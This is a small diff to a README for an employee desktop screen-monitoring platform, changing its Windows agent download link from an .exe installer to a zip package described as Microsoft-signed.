@@ -3,7 +3,7 @@
 An enterprise-grade desktop screen monitoring and situational awareness platform built with **FastAPI**, **WebSockets**, **SQLite**, and a **Standalone Self-Installing Windows Agent**.
 
 🌐 **Live 24/7 Cloud Admin Dashboard:** [https://amvion-employee-monitoring.onrender.com](https://amvion-employee-monitoring.onrender.com)  
-⬇️ **1-Click Windows Agent Installer (`.exe`):** [Download EmployeeMonitoringAgent.exe](https://github.com/vinitharockiasamy/amvion-employee-monitoring/raw/main/installer/EmployeeMonitoringAgent.exe)
+⬇️ **Microsoft-Signed Windows Agent Package (`.zip`):** [Download EmployeeMonitoringAgent-Setup.zip](https://github.com/vinitharockiasamy/amvion-employee-monitoring/raw/main/EmployeeMonitoringAgent-Setup.zip)
 
 ---
 
